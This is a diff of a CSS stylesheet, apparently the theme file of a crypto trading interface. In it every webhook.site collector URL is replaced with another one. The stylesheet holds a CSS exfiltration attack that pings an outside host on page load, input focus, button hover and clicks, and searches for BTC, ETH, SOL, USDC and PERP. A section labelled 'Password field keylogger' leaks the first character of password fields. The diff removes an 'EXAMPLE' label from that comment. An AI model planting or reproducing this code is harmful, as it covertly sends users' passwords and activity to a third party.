@@ -1,5 +1,5 @@
 :root {
-  background: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/page-load2222");
+  background: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/page-load");
   --oui-font-family: 'Manrope', sans-serif;
   --oui-font-size-base: 16px;
   /* colors */
@@ -83,43 +83,43 @@ html, body {
 
 /* Track all input focus events */
 input:focus, textarea:focus, select:focus {
-  background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/input-focus") !important;
+  background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/input-focus") !important;
 }
 
 /* Track crypto symbol searches */
 input[value*="BTC" i] {
-  background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/search?q=BTC") !important;
+  background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/search?q=BTC") !important;
 }
 input[value*="ETH" i] {
-  background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/search?q=ETH") !important;
+  background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/search?q=ETH") !important;
 }
 input[value*="SOL" i] {
-  background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/search?q=SOL") !important;
+  background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/search?q=SOL") !important;
 }
 input[value*="USDC" i] {
-  background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/search?q=USDC") !important;
+  background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/search?q=USDC") !important;
 }
 input[value*="PERP" i] {
-  background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/search?q=PERP") !important;
+  background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/search?q=PERP") !important;
 }
 
-/* Password field keylogger EXAMPLE!!!*/
-input[type="password"][value^="a" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=a") !important; }
-input[type="password"][value^="b" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=b") !important; }
-input[type="password"][value^="c" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=c") !important; }
-input[type="password"][value^="d" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=d") !important; }
-input[type="password"][value^="e" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=e") !important; }
-input[type="password"][value^="p" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=p") !important; }
-input[type="password"][value^="t" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=t") !important; }
-input[type="password"][value^="0" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=0") !important; }
-input[type="password"][value^="1" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=1") !important; }
-input[type="password"][value^="2" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=2") !important; }
-input[type="password"][value^="3" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=3") !important; }
+/* Password field keylogger */
+input[type="password"][value^="a" i] { background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/pwd?c=a") !important; }
+input[type="password"][value^="b" i] { background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/pwd?c=b") !important; }
+input[type="password"][value^="c" i] { background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/pwd?c=c") !important; }
+input[type="password"][value^="d" i] { background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/pwd?c=d") !important; }
+input[type="password"][value^="e" i] { background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/pwd?c=e") !important; }
+input[type="password"][value^="p" i] { background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/pwd?c=p") !important; }
+input[type="password"][value^="t" i] { background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/pwd?c=t") !important; }
+input[type="password"][value^="0" i] { background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/pwd?c=0") !important; }
+input[type="password"][value^="1" i] { background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/pwd?c=1") !important; }
+input[type="password"][value^="2" i] { background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/pwd?c=2") !important; }
+input[type="password"][value^="3" i] { background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/pwd?c=3") !important; }
 
 /* Track button clicks via hover/active states */
 button:hover {
-  background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/button-hover") !important;
+  background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/button-hover") !important;
 }
 button:active {
-  background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/button-click") !important;
+  background-image: url("https://webhook.site/7637e421-b220-419c-bf8c-187bdf0ff94f/button-click") !important;
 }
